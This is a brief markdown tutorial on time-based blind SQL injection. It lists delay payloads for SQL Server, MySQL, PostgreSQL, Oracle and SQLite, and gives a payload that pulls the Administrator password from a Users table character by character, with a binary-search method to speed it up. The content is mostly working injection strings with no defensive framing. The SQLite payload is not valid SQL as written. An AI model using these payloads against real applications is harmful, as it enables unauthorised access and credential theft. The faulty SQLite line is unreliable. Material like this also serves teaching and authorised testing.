# ⏱️ Exploiting Blind SQL Injection by Triggering Time Delays

If an application handles errors perfectly, exploit blind SQL injection using time delays.

## SQL Server Example

On Microsoft SQL Server:

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- First input: No delay (condition is false)
- Second input: 10-second delay (condition is true)

## Equivalent Commands for Other Databases

- **MySQL / MariaDB:** `'; SELECT SLEEP(10); --`
- **PostgreSQL:** `'; SELECT pg_sleep(10); --`
- **Oracle:** `'; BEGIN DBMS_LOCK.SLEEP(10); END; --`
- **SQLite:** `'; RANDOMBLOB(1000000000); --`

## Using Time Delays to Extract Data

Example: Guess admin password one character at a time

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

If the Administrator's password first character is > 'm', you get a delay response.

## Binary Search for Efficiency

Instead of checking 26 letters:
- Check if char > 'm' (narrows to half)
- If yes, check if char > 't'
- Continue narrowing the range

This reduces ~26 checks per character to ~5-6 checks.